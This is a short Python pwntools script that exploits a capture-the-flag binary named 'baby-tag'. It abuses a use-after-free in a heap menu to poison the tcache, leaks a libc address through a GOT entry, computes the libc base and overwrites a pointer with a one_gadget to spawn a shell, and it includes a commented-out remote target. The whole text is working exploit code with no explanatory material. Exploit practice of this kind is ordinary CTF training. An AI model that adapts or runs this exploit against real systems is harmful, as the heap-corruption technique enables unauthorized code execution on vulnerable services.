#!/usr/bin/env python3


from pwn import *

e = ELF("./baby-tag")
#r = remote("35.228.15.118",1337)
r = process("./baby-tag")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def malloc(contents):
    r.sendafter(b">",b"1\n")
    r.sendafter(b"Contents>",contents)

def free():
    r.sendafter(b">",b"2\n")

def edit(contents):
    r.sendafter(b">",b"3\n")
    r.sendafter(b"Contents>",contents)


malloc(b"A" * 8)
i = 0
while(i < 4):
    free()
    edit(b"B" * 12)
    i+=1
free()
edit(p64(e.sym["chunk"]))
malloc(b"A" * 8)
r.sendafter(b">",b"1\n")
edit(p64(e.sym["chunk"]) + b'\x04\x04')
edit(p64(0x404058))
r.recvuntil(b"You just entered:")
leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00'))
libc_base = leak - libc.sym["__isoc99_scanf"]
one_gadget = libc_base + 0xe3b31
edit(p64(one_gadget))
r.interactive()
